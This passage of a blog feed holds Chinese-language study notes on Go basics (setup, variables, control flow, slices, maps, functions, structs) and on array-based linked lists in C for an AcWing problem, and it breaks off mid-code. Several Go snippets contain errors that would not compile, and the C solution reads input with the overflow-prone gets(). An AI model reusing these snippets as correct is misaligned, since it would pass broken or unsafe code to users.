        <content type="html"><![CDATA[<h2 id="环境搭建">环境搭建</h2><h3 id="Linux">Linux</h3><p>官网下载安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pkg.go.dev/cmd/go</span><br></pre></td></tr></table></figure><p>使用wsl演示<br>将安装包解压到<code>/usr/local</code>目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -C /usr/local -xzf go1.20.6.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>修改<code>~/.bashrc</code>文件，添加以下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure><p>重新加载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>查看Go版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure><h3 id="Windows">Windows</h3><p>后续再补</p><h3 id="编辑器">编辑器</h3><p>Goland or VS code</p><h2 id="基本语法">基本语法</h2><p>这里简单整理 Go 的基础语法，可以速查。<br>一些不明白的可以查阅<a href="https://books.studygolang.com/gopl-zh/">Go语言圣经</a></p><h3 id="一、Hello-World">一、Hello World</h3><p>Go语言输出Hello World实现如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go是一门编译型语言，Go语言的工具链将源代码及其依赖转换成计算机的机器指令（即静态编译）。通过<code>go run 文件名</code>命令可以运行Go 代码。通常我们使用<code>go build 文件名</code>来构建Go代码的二进制文件。<br>Go语言的代码通过包（package）组织，类似于其他语言的库或模块，<code>package main</code>表示该文件属于main包。<code>main</code>包定义了程序的主体，其中<code>main</code>函数就是程序的入口。</p><h3 id="二、变量类型">二、变量类型</h3><ul><li>布尔型：<code>true/false</code></li><li>整形：<code>uint(8/16/32/64)/int(8/16/32/64)</code></li><li>浮点型：<code>float32/float64/complex64/complex128</code></li><li>其他类型: byte(类似 uint8), int/uint(32 或 64 位), uintptr(无符号整型，用于存放指针)</li><li>字符串：默认为 UTF-8编码</li><li>派生类型：指针/数组/函数/struct/slice/interface/map</li></ul><h3 id="三、变量与常量">三、变量与常量</h3><p>Go语言中，变量是强类型的，我们在声明变量时一定要指定变量类型。<br>定义变量有几种方式<br>第一种是使用<code>var</code>定义变量，通常来说，Go语言可以依据变量的初始值来推断出变量类型，如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = <span class="string">&quot;Hello world&quot;</span>  <span class="comment">// 字符串</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>    <span class="comment">// 整形</span></span><br><span class="line"><span class="keyword">var</span> isTrue = <span class="literal">true</span>   <span class="comment">// 布尔</span></span><br></pre></td></tr></table></figure><p>我们还可以使用<code>:=</code>运算符，作用类似于上面，如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello := <span class="string">&quot;Hello world&quot;</span></span><br><span class="line">num := <span class="number">1</span></span><br><span class="line">isTrue := <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如果需要强调类型，可以写作下面的形式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello <span class="type">string</span> = <span class="string">&quot;Hello world&quot;</span></span><br><span class="line"><span class="keyword">var</span> num <span class="type">int32</span> = <span class="number">1</span> </span><br><span class="line"><span class="keyword">var</span> isTrue <span class="type">bool</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><blockquote><p>如果不初始化变量，变量的值是什么</p></blockquote><ul><li>字符串默认值为空</li><li>整型、浮点型默认值为 0</li><li>布尔型默认值为 false</li><li>指针、channel、func、接口都为 nil</li><li>数组默认为 []</li><li>字典默认为 map[]</li></ul><p>如果需要定义常量，需要添加关键字<code>const</code>，如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> constHello = <span class="string">&quot;Hello world&quot;</span></span><br></pre></td></tr></table></figure><h3 id="四、条件">四、条件</h3><p>Go中的条件语句主要包括if-else以及switch，因为比较类似于其他语言的形式，直接使用代码说明。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if-else</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   a := <span class="number">1</span></span><br><span class="line">   <span class="keyword">if</span> a &gt;= <span class="number">0</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;a is a non-negative number&quot;</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;a is a negative number&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   b := <span class="number">10</span></span><br><span class="line">   <span class="keyword">if</span> b &gt; <span class="number">0</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;b is a positive number&quot;</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;b is 0&quot;</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;b is a negative number&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment">// switch, Go种switch不需要加break</span></span><br><span class="line">   c := <span class="number">10</span></span><br><span class="line">   <span class="keyword">switch</span> c % <span class="number">3</span>&#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: fmt.Println(<span class="string">&quot;c 能被3整除&quot;</span>)</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: fmt.Println(<span class="string">&quot;c 被3除余1&quot;</span>)</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: fmt.Println(<span class="string">&quot;c 被3除余2&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 另一种写法，可以当作一串if-else语句</span></span><br><span class="line">   <span class="keyword">switch</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> c % <span class="number">3</span> == <span class="number">0</span>: fmt.Println(<span class="string">&quot;c 能被3整除&quot;</span>)</span><br><span class="line">      <span class="keyword">case</span> c % <span class="number">3</span> == <span class="number">1</span>: fmt.Println(<span class="string">&quot;c 被3除余1&quot;</span>)</span><br><span class="line">      <span class="keyword">case</span> c % <span class="number">3</span> == <span class="number">2</span>: fmt.Println(<span class="string">&quot;c 被3除余2&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="五、循环">五、循环</h3><p>Go语言中表示循环的关键字仅有<code>for</code>一种（这正体现了Go的<code>Less is more</code>，当然我们可以利用<code>for</code>实现各种不同形式的循环（本质是一样的）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">3</span>; i++ &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//类似于while</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i &lt;= <span class="number">3</span> &#123;</span><br><span class="line">   fmt.Println(i)</span><br><span class="line">   i++</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 死循环</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">   fmt.Println(i)</span><br><span class="line">   i ++</span><br><span class="line">   <span class="keyword">if</span> i &gt; <span class="number">3</span> &#123;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="六、一些重要的数据类型">六、一些重要的数据类型</h3><h4 id="1-数组">1. 数组</h4><p>数组定义方式如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testArray [<span class="number">3</span>]<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">   testArray[i] = i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种方式</span></span><br><span class="line">arrayA := [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">arrayB := [...]<span class="type">int</span>&#123;<span class="number">1</span> , <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="number">2</span>Darray := [<span class="number">2</span>][<span class="number">2</span>]<span class="type">int</span>&#123;</span><br><span class="line">   &#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">   &#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go 中的数组是固定长度的，一旦创建了就不允许改变，空余位置用 0 填补并且不允许越界。一般来说数组使用不是很方便。</p><h4 id="2-slice">2.slice</h4><p>固定长度的数组不是很方便，所以我们一般都用切片来操作<br>slice结构体的底层定义如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">    array unsafe.Pointer <span class="comment">// 指向数组的指针</span></span><br><span class="line">    <span class="built_in">len</span> <span class="type">int</span> <span class="comment">// 切片中的元素数量</span></span><br><span class="line">    <span class="built_in">cap</span> <span class="type">int</span> <span class="comment">// array 数组的总容量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义slice，一般使用make进行定义，第一个参数表示类型，第二个表示切片长度，第三个表示容积（可省略）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">testSlice := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">testSlice[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">testSlice[<span class="number">1</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>添加元素，使用<code>append</code>方法(因为我们通常不知道返回的slice是否与原slice的指向同一个引用，通常会将插入元素后的slice重新赋值给原slice)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testSlice = <span class="built_in">append</span>(testSlice, <span class="number">3</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>获取切片大小，使用len方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(testSlice)</span><br></pre></td></tr></table></figure><p>拷贝</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line">anoSlice := testSlice</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line">another := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="built_in">len</span>(testSlice))</span><br><span class="line"><span class="built_in">copy</span>(another, testSlice)</span><br></pre></td></tr></table></figure><p>第一种方法只是将testSlice的引用传递给了anoSlice<br>anoSlice和testSlice实质上指向的是同一个slice<br>第二种方法使用copy方法<br>another和testSlice指向的是不同的slice，只是里面内容一样</p><blockquote><p>实质上，切片底层是数组。当空间不够时，切片会将自身复制到一个更大的数组上去。因为切片扩容操作涉及到拷贝，通常在实际使用中为了减小拷贝的开销，会将切片初始值设定的较大。</p></blockquote><p>选取切片部分(类似于Python的List中的操作，但不支持负数索引)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">testSlice[<span class="number">1</span>:]</span><br><span class="line">testSlice[:<span class="number">2</span>]</span><br><span class="line">testSlice[<span class="number">1</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure><h4 id="3-字典">3. 字典</h4><p>字典即由一系列键值对组成<br>定义与添加键值对<br>Go语言中的range可以同时遍历字典的键和值，当不需要某一部分时可以用<code>_</code>代替</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">m[<span class="string">&quot;Hello&quot;</span>] = <span class="number">1</span></span><br><span class="line">m[<span class="string">&quot;World&quot;</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">m1 := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;Hello&quot;</span>: <span class="number">1</span>, <span class="string">&quot;world&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">    fmt.Println(k, v)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, num := <span class="keyword">range</span> m1 &#123;</span><br><span class="line">    fmt.Println(v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除键值对使用delete方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">delete</span>(m, <span class="string">&quot;Hello&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="七、函数">七、函数</h3><h4 id="1-函数定义">1.函数定义</h4><p>在Go语言中，使用func关键字声明一个函数，函数声明的语法与其他语言略有差异。Go语言中函数也是由函数名、参数列表、返回值组成。<br>Go语言函数声明的通用格式是<code>func funcName(args) (return_type)</code>。<br>如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(num1 <span class="type">int</span>, num2 <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要强调的是，Go语言中的参数传递只有值传递，但是具体传的值，可以分为引用类型（指针/map/slice等)和非引用类型(int/string/struct/array等)。当我们传入的参数是非引用类型时，我们修改的参数值不会反映到原变量上去，如果传入的是引用类型，修改变量的内容会导致原变量发生改变（因为参数与原变量指向同一个引用）</p><h4 id="2-函数调用">2.函数调用</h4><p>Go语言中函数的调用也类似于其他语言。</p><h4 id="3-错误处理">3.错误处理</h4><p>通常来说，Go函数的错误处理很简单，只需要添加一个类型为<code>Error</code>的返回值即可。<br>比如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">greeting</span><span class="params">(name <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name, errors.New(<span class="string">&quot;Name is nil&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    Words := fmt.Sprintf(<span class="string">&quot;Hello，%v&quot;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> Words, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>我们添加了一个返回值类型<code>error</code>，它用于接收程序运行的错误信息。</li><li>当name为空时，我们返回错误信息</li><li>如果允许正常，我们的<code>error</code>为<code>nil</code>，通常来说，<code>nil</code>也是程序运行正常的标志</li><li>在调用函数时，只需要用一个变量接收<code>error</code>，并对其进行判断、处理即可。</li></ul><h3 id="八、结构体">八、结构体</h3><p>面向对象是一个重要的思想，Go语言中可以使用结构体实现面向对象。<br>我们可以使用<code>struct</code>关键字定义类名、成员变量等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> O <span class="keyword">struct</span>&#123;</span><br><span class="line">    <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="type">int</span></span><br><span class="line">    b O</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> i1 T<span class="comment">// 值类型</span></span><br><span class="line"><span class="keyword">var</span> i2 <span class="built_in">new</span>(T)<span class="comment">// 引用类型</span></span><br></pre></td></tr></table></figure><p>在面向对象中，一个对象不仅要包括成员变量，还需要包括对象的方法。Go语言中通过在函数前添加声明，来将某个函数绑定到某个结构体上。<br>那么函数的定义将变为<br><code>func (structName structType) funcName(args) (return_type)</code><br>即在函数名前面添加参数名称和需要绑定的结构体即可。<br>需要注意的是，我们传入的可以是struct的值，也可以传入struct的指针。struct是非引用类型，当我们需要直接修改struct的成员变量的值，我们需要传入指针。<br>传入的struct和其对应的方法必须在同一个包内。</p>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>algo_learn_1</title>
      <link href="/2023/07/algo-learn-1/"/>
      <url>/2023/07/algo-learn-1/</url>
      
        <content type="html"><![CDATA[<p>并非合理的实现，只是方便通过笔试</p><h2 id="一、单链表">一、单链表</h2><p>定义略<br>操作代码<br>做题的时候经常拿数组模拟链表（防止超时）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e[N]存储值，ne[N]存储对应索引的节点下一个节点的索引</span></span><br><span class="line"><span class="comment">// idx指当前操作的数组索引，head为头节点,即处于链表头部的节点索引</span></span><br><span class="line"><span class="type">int</span> e[N], ne[N], idx, head;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">head = <span class="number">-1</span>;<span class="comment">// -1表示指向空</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert_head</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head;</span><br><span class="line">    head = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入索引为k的节点之后</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">e[idx] = x;</span><br><span class="line">ne[idx] = ne[k<span class="number">-1</span>];</span><br><span class="line">ne[k<span class="number">-1</span>] = idx;</span><br><span class="line">idx ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除索引为k后面的节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">ne[k<span class="number">-1</span>] = ne[ne[k<span class="number">-1</span>]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing826更适合用数组模拟链表，因为题目要求的插入操作都是对第k个插入的数插入。使用普通的链表找不到插入的顺序关系<br><a href="https://www.acwing.com/problem/content/828/">原文链接</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> e[N], ne[N], idx, head;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">head = <span class="number">-1</span>;<span class="comment">// -1表示指向空</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert_head</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head;</span><br><span class="line">    head = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入索引为k的节点之后</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">e[idx] = x;</span><br><span class="line">ne[idx] = ne[k<span class="number">-1</span>];</span><br><span class="line">ne[k<span class="number">-1</span>] = idx;</span><br><span class="line">idx ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除索引为k后面的节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">ne[k<span class="number">-1</span>] = ne[ne[k<span class="number">-1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        gets(a);</span><br><span class="line">        <span class="type">int</span> x, k;</span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;, a);</span></span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>] == <span class="string">&#x27;H&#x27;</span>)&#123;</span><br><span class="line">            x = atoi(a + <span class="number">2</span>);</span><br><span class="line">            insert_head(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">            k = atoi(a + <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">0</span>) &#123;head = ne[head];&#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;remove_node(k);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            k = atoi(a + <span class="number">2</span>);</span><br><span class="line">            <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;<span class="keyword">while</span>(a[i]!=<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            x = atoi(a+i+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// printf(&quot;%d&quot;,x);</span></span><br><span class="line">            insert(k, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = head;</span><br><span class="line">    <span class="keyword">while</span>(i != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">        i = ne[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、双链表">二、双链表</h2><p>特点：链表中每一个元素均指向前一节点和后一节点<br>操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span 